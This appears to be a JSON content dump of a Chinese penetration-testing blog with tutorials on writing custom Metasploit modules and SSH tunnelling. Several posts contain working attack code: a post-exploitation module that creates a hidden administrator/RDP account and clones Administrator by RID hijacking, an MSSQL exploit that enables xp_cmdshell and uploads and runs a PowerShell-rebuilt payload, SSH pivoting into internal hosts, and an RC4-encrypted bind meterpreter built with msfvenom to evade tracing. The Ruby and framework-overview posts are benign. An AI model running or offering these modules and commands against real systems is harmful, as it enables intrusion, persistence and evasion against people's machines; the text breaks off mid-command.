{"meta":{"title":"AnonySec'Blog","subtitle":"","description":"","author":"AnonySec","url":"https://payloads.cn","root":"/"},"pages":[{"title":"关于","date":"2020-01-09T05:48:19.642Z","updated":"2020-01-09T05:48:19.639Z","comments":false,"path":"about/index.html","permalink":"https://payloads.cn/about/index.html","excerpt":"","text":"1ID：AnonySec2不甘在奋斗的年纪选择安逸，记录这一路的成长历程。3———— Hang&#39;Day42019.12.5 凌晨"},{"title":"分类","date":"2019-12-04T13:50:02.023Z","updated":"2019-12-04T13:50:02.014Z","comments":false,"path":"categories/index.html","permalink":"https://payloads.cn/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-05T14:55:21.787Z","updated":"2019-12-04T13:50:11.945Z","comments":false,"path":"tags/index.html","permalink":"https://payloads.cn/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"打造定制化的Metasploit—克隆用户","slug":"打造定制化的Metasploit—克隆用户","date":"2020-03-27T16:56:12.000Z","updated":"2020-07-05T13:42:23.327Z","comments":true,"path":"2020/0328/create-customized-metasploitclone-users.html","link":"","permalink":"https://payloads.cn/2020/0328/create-customized-metasploitclone-users.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言在进行内网横向移动时，可以理解为后渗透过程，如何利用Metasploit打造后渗透模块，如何基于session进行操控？比如: 在当前会话上检查系统权限，或者添加用户等。最终解决实战中的需求：利用已获取session，创建登录账户，添加该账户到管理员与远程桌面组，并克隆administrator，从而替代clone.exe。编写后渗透模块代码头部仅需要在头部添加meterpreter会话的类型，该模块就可以在session上进行操控。检查会话权限这里编写一个简单的模块，检查当前会话是否具有管理员权限,引用lib/msf/core/post/windows/priv.rb中的is_admin?函数。1def run2 # 检查会话的特权3 print_status(\"Checking for SYSTEM privileges on session\")45 admin_check = is_admin?6 if(admin_check)7 print_good(\"\\tCurrent User Is Admin\")8 else9 print_error(\"\\tCurrent User is Not Admin\")10 end11end如果说权限不足，可以在当前session尝试提权，同时也是引用priv.rb。在Module options中可增加模块选项，进行设置。1register_options(2 [3 OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false]),4 ])当getsystem为true时，运行如下定义：1def getsystem2 results = session.priv.getsystem3 if results[0]4 return true5 else6 return false7 end8endrun主函数也可使用is_system?，对当前会话的系统权限检查。1def run2 # 检查操作系统版本3 wver = sysinfo[\"OS\"]4 print_status(\"Target OS: #&#123;wver&#125;\")5 # 检查会话的特权，并在需要时尝试获得系统特权。6 print_status(\"Checking for SYSTEM privileges on session\")7 if !is_system?8 if datastore['GETSYSTEM']9 print_status(\"Trying to get SYSTEM privileges\")10 if getsystem11 print_good(\"\\tGet SYSTEM privileges\")12 else13 print_error(\"Could not obtain SYSTEM privileges\")14 return15 end16 else17 print_error(\"Session is not running with SYSTEM privileges. Try setting GETSYSTEM \")18 return19 end20 else21 print_good(\"\\tSession is already running with SYSTEM privileges\")22 end2324 return nil25end检查当前会话权限与尝试提权的完整Demo：添加用户以上一个简单的Demo已经实现了当前会话的权限检查，之后编写利用当前session创建用户，并且在未设置密码时，可随机设置8位密码，增加一些复杂度。1def add_users2 if datastore['PASSWORD'].nil?3 # 创建随机8位密码4 datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)5 print_status(\"You have not set up a PASSWORD. The default is '#&#123;datastore['PASSWORD']&#125;'\")6 end7 # 添加用户8 if enum_user.include? datastore['USERNAME']9 print_error(\"User '#&#123;datastore['USERNAME']&#125;' already exists.\")10 else11 result = add_user(datastore['USERNAME'], datastore['PASSWORD'])12 if result['return'] == 013 print_good \"\\tAdding User: #&#123;datastore['USERNAME']&#125; with Password: #&#123;datastore['PASSWORD']&#125;\"14 else15 check_result(result)16 end17 end18end添加管理员与远程桌面组创建完用户后，还需要将该用户添加管理员组，使该用户有更高的权限。并且在远程桌面时，可能也需要添加至远程桌面组。该定义引用了post/windows/manage/enable_rdp部分代码。克隆用户这段代码的定义实际应用了Windows RID劫持技术，在实战中应用的更多的是Clone.exe，其原理大同小异。Metasploit中的post/windows/manage/rid_hijack模块正是利用RID劫持技术实现了这一点。最后，将以上讲述的代码与rid_hijack模块结合，便解决了文章开篇提出的实战需求：利用已获取session，创建登录账户，添加该账户到管理员与远程桌面组，并克隆administrator，从而替代clone.exe。ReferencesMetasploit APIMetasploit WIKIRID Hijacking on Windows","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—MSSQL重构","slug":"打造定制化的Metasploit—MSSQL重构","date":"2020-03-24T11:05:08.000Z","updated":"2020-07-05T13:42:23.278Z","comments":true,"path":"2020/0324/create-customized-metasploit—mssql-reconstruction.html","link":"","permalink":"https://payloads.cn/2020/0324/create-customized-metasploit%E2%80%94mssql-reconstruction.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言在进行内网渗透时，有时会遇到SQL Server数据库，当获取到正确口令信息时，经常会用到SQLTOOLS一类的渗透工具，但依赖xp_cmdshell需要开启，才能执行系统命令。这里就联想到实战中的需求，也正是本文要讲述的方法：利用Metasploit，通过正确的SQL Server口令信息，可启用xp_cmdshell，并获取目标系统session。参数msftidy使用Metasploit中名为msftidy的内置工具，检查开发的模块语法是否正确。loadpathMetasploit每次更新，所有模块都会被删除，创建外部目录不被删除（虚拟分支）: 外部目录要与msf目录结构相同，之后在msf中使用loadpath 绝对路径/Metasploit/载入。当前msf适用，退出后需要重新加载loadpathreload在不关闭metasploit的情况下使用reload命令重新载入编辑过的模块。内置模块测试Metasploit中内置了mssql_payload模块，但攻击效果不是很好，session弹不回来。编写mssql_powershell模块mssql_powershell是在mssql_payload基础上进行修改的。接下来进行分解讲述：代码头部1##2# This module requires Metasploit: https://metasploit.com/download3# Current source: https://github.com/rapid7/metasploit-framework4##56require 'msf/core' # 引用 core 核心库78class MetasploitModule &lt; Msf::Exploit::Remote # 定义这是一个远程攻击模块9 Rank = ExcellentRanking1011 include Msf::Exploit::Remote::MSSQL # 包含 lib/msf/core/exploit/mssql.rb 库1213 def initialize(info = &#123;&#125;)14 super(update_info(info,15 'Name' =&gt; 'Microsoft SQL Server Powershell payload ',16 # %q 单引号字符串17 'Description' =&gt; %q&#123;18 This module will deliver our payload through Microsoft PowerShell using MSSQL based attack vectors.19 &#125;,20 'Author' =&gt;21 [22 'AnonySec@DropLab',23 ],24 'License' =&gt; MSF_LICENSE,25 'Platform' =&gt; 'win', # 仅支持windows平台26 'Arch' =&gt; [ ARCH_X86, ARCH_X64 ],27 'Targets' =&gt;28 [29 [ 'Automatic', &#123; &#125; ],30 ],31 'DefaultTarget' =&gt; 0,32 ))基本选项Boolean 布尔选项类型 https://rapid7.github.io/metasploit-framework/api/Msf/OptBool.htmlRequired (参数是否为必填项) “false”Current Setting (当前的设置) “true” 即默认使用 PowerShell1register_options(2 [3 OptBool.new('UsePowerShell', [ true, \"Use Powershell as payload delivery method instead\",true ])4 ])检查目标是否存在漏洞可被利用1def check2 if !mssql_login_datastore3 vprint_status(\"Invalid SQL Server credentials\")4 return Exploit::CheckCode::Detected5 end6 7 # 查询mssql版本8 mssql_query(\"select @@version\", true)9 if mssql_is_sysadmin10 vprint_good \"User #&#123;datastore['USERNAME']&#125; is a sysadmin\"11 Exploit::CheckCode::Vulnerable12 else13 Exploit::CheckCode::Safe14 end15 ensure16 disconnect17 end启用xpcmdshell先以SQLTOOLS工具尝试回到代码中，引用mssql.rb中的mssql_xpcmdshell方法1def run2 mssql_xpcmdshell(datastore['CMD'], true) if mssql_login_datastore3end定义主体代码定义upload_powershell_exec主要函数，exe是从下面Msf::Util::EXE.to_win32pe(framework,payload.encoded)发过来的二进制文件1def upload_powershell_exec(exe, debug=false)调试状态下debug=true的输出十六进制转换，创建随机文件名，输出状态1# 十六进制转换，“H:打开二进制格式的文件，以十六进制转换“2hex = exe.unpack(\"H*\")[0]3# 创建随机8位字母的文件名4var_payload = rand_text_alpha(8)5# payload保留在目标系统 C:\\Windows\\\\Temp\\ 目录下6print_status(\"Warning: This module will leave #&#123;var_payload&#125;.exe in the SQL Server C:\\\\Windows\\\\Temp\\\\ directory\")通过powershell创建一个从十六进制至二进制的转换：$s变量中的`r 与 `n替换空字符，去除回车换行符，由于MSSQL存在一个字符长度限制，需要将十六进制的payload分成500字节分块，payload被分到多个请求中，传到目标系统中就会被添加回车换行符。如不去除，生成的二进制文件将损坏，就不能执行；通过[Convert]::ToByte 让powershell将十六进制的文件写入到 #{var_payload}.exe 二进制程序中1h2b = \"$s = gc 'C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;';$s = [string]::Join('', $s);$s = $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %&#123;$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)&#125;;[IO.File]::WriteAllBytes('C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe',$b)\"转换编码，输出状态1# 将h2b字符串转换为Unicode编码2h2b_unicode=Rex::Text.to_unicode(h2b)3# 将Unicode字符串进行base64编码4h2b_encoded = Rex::Text.encode_base64(h2b_unicode)5# 输出状态，正在上传payload6print_status(\"Uploading the payload #&#123;var_payload&#125;, please be patient...\")计数器idx每次增长cnt(500)个字节。简单说：读取500字节，发送，再读取，再发送，直到读到文件末尾。1# 基础计数器idx最初位置为0，标识文件末尾2idx = 03# 每次发送十六进制文件到操作系统时递增500字节。4cnt = 5005while(idx &lt; hex.length - 1)6 mssql_xpcmdshell(\"cmd.exe /c echo #&#123;hex[idx, cnt]&#125;&gt;&gt;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;\", false)7 idx += cnt8end利用PowerShell EncodedCommand命令转换payload，之后执行，输出相关状态1print_status(\"Converting the payload utilizing PowerShell EncodedCommand...\")2mssql_xpcmdshell(\"powershell -EncodedCommand #&#123;h2b_encoded&#125;\", debug)3mssql_xpcmdshell(\"cmd.exe /c del C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;\", debug)4print_status(\"Executing the payload...\")5mssql_xpcmdshell(\"C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe\", false, &#123;:timeout =&gt; 1&#125;)6print_status(\"Be sure to cleanup #&#123;var_payload&#125;.exe...\")攻击模块的主体代码使用1def exploit2 # 检查是否已经正常登陆3 if !mssql_login_datastore4 # 口令错误无法登陆输出该状态 “[*] xx.xx.xx.xx:1433 - Invalid SQL Server credentials”5 print_status(\"Invalid SQL Server credentials\")6 return7 end8 # UsePowerShell 方法调用 upload_powershell_exec 函数9 if (datastore['UsePowerShell'])10 # Msf::Util::EXE.to_win32pe(framework,payload,encoded) 自动产生一个可用的二进制payload 11 # https://rapid7.github.io/metasploit-framework/api/Msf/Util/EXE.html#to_win32pe-class_method12 upload_powershell_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded))13 end处理与目标系统间的连接1handler2disconnect完整载入运行1msf5 &gt; loadpath /Users/anonysec/Desktop/Metasploit/2msf5 &gt; use exploit/windows/mssql/mssql_powershell3msf5 exploit(windows/mssql/mssql_powershell) &gt; set payload windows/meterpreter/bind_tcp4msf5 exploit(windows/mssql/mssql_powershell) &gt; set rhost 192.168.144.2125msf5 exploit(windows/mssql/mssql_powershell) &gt; set password Admin1236msf5 exploit(windows/mssql/mssql_powershell) &gt; set lport 53537msf5 exploit(windows/mssql/mssql_powershell) &gt; run注：调试状态下debug=true小结只要对Metasploit框架有兴趣，并已经查看了现有代码是如何工作的，就可以充分利用现有代码，拿过来改改，并增加一些原创代码这样的流程。在大多数情况下，没必要完全从零开始来编写自己的模块代码。这就是代码重用的能量。ReferencesMetasploit APIMetasploit WIKI《Metasploit: The Penetration Tester’s Guide》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—分析HTTP模块","slug":"打造定制化的Metasploit—分析HTTP模块","date":"2020-03-02T01:11:13.000Z","updated":"2020-07-05T13:42:23.300Z","comments":true,"path":"2020/0302/create-customized-metasploit—analyze-http-module.html","link":"","permalink":"https://payloads.cn/2020/0302/create-customized-metasploit%E2%80%94analyze-http-module.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn分析HTTP扫描模块分析的模块位于/modules/auxiliary/scanner/http/http_version.rb首先来看模块头的引入与类的定义：1##2# This module requires Metasploit: https://metasploit.com/download3# Current source: https://github.com/rapid7/metasploit-framework4##56require 'rex/proto/http' 78class MetasploitModule &lt; Msf::Auxiliaryrequire &#39;rex/proto/http&#39;表示该模块将要引入这个rex库文件目录下的所有http协议方法，所有的模块都可以被调取使用。包括用于设置连接的函数，get和post的请求和响应处理等。Msf::Auxiliary定义了该代码的类为辅助模块。如下为/lib/rex/proto/http目录下的内容：[注：继承有助于重用代码和快速执行，不幸的是，Ruby不支持多继承，但是Ruby支持mixins。mixin就像是多继承的一个特定实现，在多继承中，只有接口部分是可继承的。]1# Exploit mixins should be called first(首先调用渗透模块mixins类)2include Msf::Exploit::Remote::HttpClient3include Msf::Auxiliary::WmapScanServer4# Scanner mixin should be near last(接着是扫描模块mixins类)5include Msf::Auxiliary::Scanner上面代码所必需库文件中涵盖了编写模块所需要的所有方法，这些库文件的详细信息如下：语句引入路径用途Msf::Exploit::Remote::HttpClient/lib/msf/core/exploit/http/client.rb这个库文件提供了大量方法，例如连接到目标计算机、发送请求、切断与客户端的连接等。Msf::Auxiliary::WmapScanServer/lib/msf/core/auxiliary/wmapmodule.rbwmap是一款基于Metasploit的通用Web应用程序扫描框架，有助于完成Metasploit的Web渗透测试。Msf::Auxiliary::Scanner/lib/msf/core/auxiliary/scanner.rb这个文件包含了基于扫描模块的所有函数，提供了模块运行、模块初始化、扫描进度等各种方法。这个initialize方法是Ruby编程语言中的默认构造方法。它定义了名称Name、描述Description、作者Author、许可License等。许可就是&#39;License&#39; =&gt; MSF_LICENSE，最后用一个end结束。1def initialize2 super(3 'Name' =&gt; 'HTTP Version Detection',4 'Description' =&gt; 'Display version information about each system.',5 'Author' =&gt; 'hdm',6 'License' =&gt; MSF_LICENSE7 )89 register_wmap_options(&#123;10 'OrderID' =&gt; 0,11 'Require' =&gt; &#123;&#125;,12 &#125;)13 end最后这段代码才是真正干活做事的：1def run_host(ip)2 begin3 connect4 res = send_request_raw(&#123; 'uri' =&gt; '/', 'method' =&gt; 'GET' &#125;)5 fp = http_fingerprint(:response =&gt; res)6 print_good(\"#&#123;ip&#125;:#&#123;rport&#125; #&#123;fp&#125;\") if fp7 report_service(:host =&gt; rhost, :port =&gt; rport, :sname =&gt; (ssl ? 'https' : 'http'), :info =&gt; fp)8 rescue ::Timeout::Error, ::Errno::EPIPE9 ensure10 disconnect11 end12 end先来解释下在本段代码中所使用的重要函数：函数引入库文件用途run_host/lib/msf/core/auxiliary/scanner.rb使用IP与所需主机建立连接connect/lib/msf/core/exploit/http/client.rb与目标服务器建立一个HTTP类型的连接send_request_raw/lib/msf/core/exploit/http/client.rb用来向目标发送原始的HTTP请求http_fingerprint/lib/msf/core/exploit/http/client.rb将HTTP响应解析为可以使用的变量在这里会产生疑问，就是从代码上下文中根本不清楚函数的具体定义，该如何解决？这时就需要查询Metasploit API官方文档。下面来具体查询分析下：run_host 在run方法中，作用是与所需主机建立连接。begin意味着代码块的开始。如果连接成功，就进行到connect方法，用于与目标服务器建立一个HTTP类型的连接。之后使用send_request_raw方法，连接到服务器，创建请求，发送请求，读取响应。并将这个方法的参数URI的值设置为/，参数method的值设置为GET，将这个响应保存在res变量。res = send_request_raw({ &#39;uri&#39; =&gt; &#39;/&#39;, &#39;method&#39; =&gt; &#39;GET&#39; })如果连接成功，使用http_fingerprint方法，记录和过滤信息。如：Set-cookie、Powered-by等。接着再把收到的响应信息赋值给res，意味着将根据之前发送请求的响应数据进行特征匹配。fp = http_fingerprint(:response =&gt; res)之后对这些响应数据进行输出打印。最后，rescue ::Timeout::Error, ::Errno::EPIPE 将会在模块超时的情况下处理程序的异常。可见，输出的格式对应print_good(&quot;#{ip}:#{rport} #{fp}&quot;) if fpReferencesMetasploit APIMetasploit WIKI《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—体系框架","slug":"打造定制化的Metasploit—体系框架","date":"2020-02-28T11:10:05.000Z","updated":"2020-07-05T13:42:23.326Z","comments":true,"path":"2020/0228/create-customized-metasploit—system-framework.html","link":"","permalink":"https://payloads.cn/2020/0228/create-customized-metasploit%E2%80%94system-framework.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cnMetasploit框架结构Metasploit的体系框架结构示意图如下：文件结构Metasploit中的文件结构如下：目录用途lib包含Metasploit模块的全部重要库文件 (Metasploit的核心与灵魂)modules包含Metasploit中的所有模块tools包含用于辅助渗透测试的命令行程序plugins包含所有用于扩展Metasploit功能的插件，例如OpenVAS、Nessus…scripts包含Meterpreter和其他各种脚本## 库的布局Metasploit的模块是由各种各样的函数构成的。这些函数包括各种基础库文件以及使用Ruby 编写的通用程序。在使用这些函数之前，首先要知道这些函数是什么，如何使用这些函数，调用 函数时需要传递多少个参数?更重要的是，这些函数的返回值会是什么?库的实际位置重要的rex库文件位于/lib目录下:（在/lib下还包含了各种服务的重要目录）另外两个重要的库/base和/core位于/msf目录下:/msf/core库文件提供核心的辅助模块core/exploits/目录是Metasploit模块广泛使用的库文件core/目录下还可以找到支持各种类型模块的所有相关库文件(渗透、攻击载荷、后渗透、编码器和各种其他模块的core库)重要文档通过以上对Metasploit框架结构的介绍，已经有所熟悉。接下来，在打造定制化的Metasploit过程中，可以结合官方文档，下面列出一些比较重要的文档供参考：搭建Metasploit开发环境，创建一个专门用来开发的Metasploit版本 msf5：官方文档 中文文档社区贡献指南，请参照官方给出的代码规范进行开发：官方文档 中文文档Metasploit API，能够查询大量的类、模块、函数定义等等：官方文档一些其他的开发技能，包括但不局限于 git使用、ruby 语法、Metasploit 使用了解等。模块格式首先，开发的Metasploit模块，最好的办法就是先深入理解它现有模块的内部机制，看看是如何工作的。Metasploit通用的框架头部如下：1require 'msf/core'23class MetasploitModule &lt; Msf::Auxiliary4 def initialize(info = &#123;&#125;)5 super(6 update_info(7 info,8 'Name' =&gt; 'Sample Auxiliary Module',9 # The description can be multiple lines, but does not preserve formatting.10 'Description' =&gt; 'Sample Auxiliary Module',11 'Author' =&gt; ['Joe Module &lt;joem@example.com&gt;'],12 'License' =&gt; MSF_LICENSE,13 )14 )15 end1617 def run18 # Main function19 end一个框架一般都会从使用require关键字导入重要的库文件开始，上面的代码就导入了msf/core库。所以，这个框架中就包含了msf目录下的core库文件。接下来主要是使用MetasploitModule指定这个类的类型。在定义类型的那行中，需要定义类的用途。上面代码定义了类的用途为MSF::Auxiliary。initialize方法是Ruby编程语言中的默认构造方法。在这个方法中，我们定义了名称 (Name)、描述(Description)、作者(Author)、许可(License)等。许可就是&#39;License&#39; =&gt; MSF_LICENSE。辅助模块中的主函数是run方法，除非要使用特别多的方法,否则所有的操作都应该在这个函数里面执行。但是程序仍然要从run方法开始执行。ReferencesMetasploit APIMetasploit WIKI《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—认识Ruby","slug":"打造定制化的Metasploit—认识Ruby","date":"2020-02-20T07:09:30.000Z","updated":"2020-07-05T13:44:27.470Z","comments":true,"path":"2020/0220/build-customized-metasploitmeet-ruby.html","link":"","permalink":"https://payloads.cn/2020/0220/build-customized-metasploitmeet-ruby.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言Ruby编程语言可以说是Metasploit框架的核心，想要学习好Metasploit模块编写必须要会Ruby。不过Ruby到底是什么呢？根据Ruby官方网站的说法：”Ruby一门开源的动态编程语言，注重简洁和效率。Ruby 的句法优雅，读起来自然，写起来舒适。”（引自Ruby中文官网）简单来说，Ruby是一种简单快捷的面向对象（面向对象程序设计）脚本语言。ruby 另以”红宝石”命名。本文只讲解涉及编写Metasploit模块所必需的Ruby知识，如需更多介绍可以查阅Ruby教程，进行学习。创建第一个ruby程序如需了解Ruby的安装过程，可自行百度，本文不进行讲解。下载RubyRuby的交互式命令行这里直接使用Kali系统自带的Ruby环境，跟Python等语言一样，ruby也有命令交互的，输入irb即可进入到命令行交互操作。下面做个 计算 与 赋值 的简单操作：命令行中定义方法方法或函数是一组语句，当强调它们时就会执行。在使用Metasploit模块时，Ruby的方法是一个很重要的部分。语法格式：1def method_name [( [arg [= default]]...[, * arg [, &amp;expr ]])]2 expr..3end首先已def开始，end声明放在最后来结束对方法的定义，arg指的是方法所接收的参数，expr指的是用来接受并计算的表达式。下面定义一个函数方法：可以看到，函数通过运算打印出了正确的结果。Ruby语言提供了puts和print这两种输出打印函数。当涉及Metasploit时，将使用print_line函数。下面分别使用print_line、print_good、print_error、print_warning、print_status、与print_blank_line语句来表示行、成功执行、错误执行、警告、状态与换行：1def run2 print_line(\"---\")3 print_good(\"successful\")4 print_error(\"error\")5 print_warning(\"warning\")6 print_status(\"status\")7 print_blank_line8 endRuby中的变量和数据类型变量是指一个值可以随时改变的占位符。Ruby语言支持众多的数据类型，但只讲解与Metasploit相关的数据类型。字符串处理使用Ruby语言编写Metasploit模块时，尽量使用双引号标记，因为单引号可能会产生问题：字符串连接将两个不同结果连接成一个字符串，使用+运算符实现字符串的连接；当需要一个变量后面追加数据的时候，可以使用&lt;&lt;运算符：子字符串substring函数split函数Ruby中的数字和转换在处理用户输入是，可以用to_i函数将字符串类型的输入转换成数字；另外，可以用to_s函数将一个数字转换成字符串。数制转换16进制到10进制的转换10进制到16进制的转换范围范围(range)是一个很重要的内容，广泛应用在Metasploit的辅助模块中。例如auxiliary…一个范围的对象提供多种操作：搜索、查找最小值与最大值、显示范围中的所有数据。这里include?函数可以检查范围中是否包含某一个特定的值。此外，min与max分别显示范围中的最小值和最大值。Ruby中的循环迭代语句被称为循环。Ruby的语法和其他编程语言的不同之处：1def for1(a)2 for i in 0..a3 print (\"This number is #&#123;i&#125;\\n\")4 end5end6for1 (10)这里使用#{i}去打印输出的变量i的值,关键字\\n指定开始新的一行。而迭代循环是通过each实现的，在Metasploit模块中被广泛使用。1def each_example(a)2 a.each do |i|3 print i.to_s + \"\\t\"4 end5end6a=Array.new(5)7a=[5,10,15,20,25]8each_example(a)定义一个方法，并接收数组a，再用each循环打印出来。ReferencesMetasploit APIMetasploit WIKI《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"SSH加密隧道之端口转发","slug":"SSH加密隧道之端口转发","date":"2020-01-09T05:35:28.000Z","updated":"2020-01-13T08:43:01.574Z","comments":true,"path":"2020/0109/ssh-encrypted-tunnel-port-forwarding.html","link":"","permalink":"https://payloads.cn/2020/0109/ssh-encrypted-tunnel-port-forwarding.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn简介SSH会自动加密和解密所有SSH客户端与服务端之间的网络数据，还能够将其他TCP端口的网络数据通过SSH连接进行转发，并且自动提供了相应的加密及解密服务，这一过程被叫做“SSH隧道” (tunneling)。SSH隧道加密传输，两大优势：加密SSH Client 端至SSH Server 端之间的通讯数据突破防火墙的限制完成一些之前无法建立的TCP 连接SSH隧道加密传输， C/S 模式的架构，配置文件分为：服务器端配置文件：/etc/ssh/sshd_config客户端配置文件：/etc/ssh/ssh_config、用户配置文件~/.ssh/config参数详解关于建立ssh隧道时所用到一些参数的详细解释：1-C 压缩传输，加快传输速度2-f 在后台对用户名密码进行认证3-N 仅仅只用来转发，不用再弹回一个新的shell -n 后台运行4-q 安静模式，不要显示任何debug信息5-l 指定ssh登录名6-g 允许远程主机连接到本地用于转发的端口7-L 进行本地端口转发8-R 进行远程端口转发9-D 动态转发，即socks代理10-T 禁止分配伪终端11-p 指定远程ssh服务端口本地转发把本地端口数据转发到远程服务器，本地服务器作为SSH客户端及应用户端，称为正向 tcp 端口加密转发。基础环境本地攻击机 10.11.42.99☁️VPS 192.168.144.174☁️目标Widnwos Web服务器(出网) 192.168.144.210必要配置到☁️VPS192.168.144.174机器上修改 ssh 配置：1# vim /etc/ssh/sshd_config23AllowTcpForwarding yes4GatewayPorts yes5TCPKeepAlive yes6PasswordAuthentication yes78# service ssh restart参数详解AllowTcpForwarding是否允许TCP转发，默认值为”yes”。GatewayPorts是否允许远程主机连接本地的转发端口，默认值是”no”。GatewayPorts no这可以防止连接到服务器计算机外部的转发端口。GatewayPorts yes这允许任何人连接到转发的端口。如果服务器在公共互联网上，互联网上的任何人都可以连接到端口。GatewayPorts clientspecified这意味着客户端可以指定一个IP地址，该IP地址允许连接到端口的连接。其命令是：ssh -R 1.1.1.1:8080:localhost:80 www.example.com在这个例子中，只有来自IP地址为1.1.1.1且目标端口是8080的被允许。TCPKeepAlive指定系统是否向客户端发送 TCP keepalive 消息，默认值是”yes”。这种消息可以检测到死连接、连接不当关闭、客户端崩溃等异常。可以理解成保持心跳，防止 ssh 断开。具体流程先在本地攻击机执行ssh转发，之后用远程桌面连接本地的33389端口，实际是连接192.168.144.210的远程桌面。简单说 就是通过☁️VPS这台机器把本地攻击机的33389端口转到了☁️目标服务器的3389端口上，也就是说这个ssh 隧道是建立在本地攻击机与☁️VPS之间的。1ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Host2ssh -C -f -N -g -L 33389:192.168.144.210:3389 root@192.168.144.174 -p 22远程转发把远程端口数据转发到本地服务器，本地服务器作为SSH客户端及应用服务端，称为反向tcp端口加密转发。基础环境☁️VPS 10.11.42.99☁️目标Linux Web服务器(出网) 192.168.144.174目标Widnwos Web服务器(不出网) 192.168.144.210必要配置现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置：1# vim /etc/ssh/sshd_config23AllowTcpForwarding yes4GatewayPorts yes5TCPKeepAlive yes6PasswordAuthentication yes78# service ssh restart具体流程继续在☁️目标服务器(出网)执行ssh转发，通过 ☁️VPS这台机器，把来自外部的33389端口流量都转到目标服务器(不出网)的 3389 上。1ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Host2ssh -C -f -N -g -R 33389:192.168.144.210:3389 anonysec@10.11.42.99 -p 22回到 ☁️VPS这台机器，查看33389端口是否处于监听状态。如果处于监听状态，则说明ssh隧道建立成功。注意：隧道建立成功后，默认并非监听在 0.0.0.0，而是监听在 127.0.0.1，可以用rinetd再做一次本地转发。先在☁️VPS上装好rinetd，之后在rinetd配置文件中添加一条转发规则。1apt install rinetd -y2vim /etc/rinetd.conf340.0.0.0 3389 127.0.0.1 33389 #转发规则56service rinetd startrinetd本地转发后，查看端口是否处于监听状态。1netstat -an |egrep \"3389|33389\"远程连接☁️VPS的3389端口，成功连接进入目标服务器(不出网)的远程桌面中。动态转发动态端口转发实际上是建立一个ssh正向加密的socks4/5代理通道，任何支持socks4/5协议的程序都可以使用这个加密的通道来进行代理访问，称为正向加密socks。基础环境☁️VPS 10.11.42.99☁️目标Linux Web服务器(出网) 192.168.144.174目标Widnwos Web服务器(不出网) 192.168.144.210目标Widnwos Web2服务器(不出网) 192.168.144.155必要配置现已获取☁️目标服务器(出网)权限，在该机器上修改 ssh 配置：1# vim /etc/ssh/sshd_config23AllowTcpForwarding yes4GatewayPorts yes5TCPKeepAlive yes6PasswordAuthentication yes78# service ssh restart具体流程在☁️VPS执行ssh转发，并查看10080端口是否处于监听状态。1ssh -C -f -N -g -D listen_port user@Tunnel_Host2ssh -C -f -N -g -D 10080 root@192.168.144.174 -p 22 #监听127.0.0.13ssh -C -f -N -g -D 0.0.0.0:10080 root@192.168.144.174 -p 22 #监听0.0.0.0回到metasploit机器上，挂 socks 代理，扫描内网服务器MS17_010。1sudo msfconsole -q2msf5 &gt; setg proxies socks5:10.11.42.99:100803msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_0104msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.2105msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 106msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run双重加密利用”ssh隧道+rc4双重加密”去连接目标内网下指定机器上的meterpreter，让payload变的更加难以追踪。首先，用msfvenom生成bind的rc4 payload，并将rc4.exe传入到目标Web2服务器(不出网)中，并执行。1msfvenom -p windows/meterpreter/bind_tcp_rc4 rc4password=AnonySec lport=443 -f exe -o rc4.exe回到metasploit机器上，挂 socks 代理，直接bind连接到目标内网中Web2服务器(不出网)的meterpreter下。1sudo msfconsole -q2msf5 &gt; setg proxies socks5:10.11.42.99:100803msf5 &gt; use exploit/multi/handler4msf5 exploit(multi/handler) 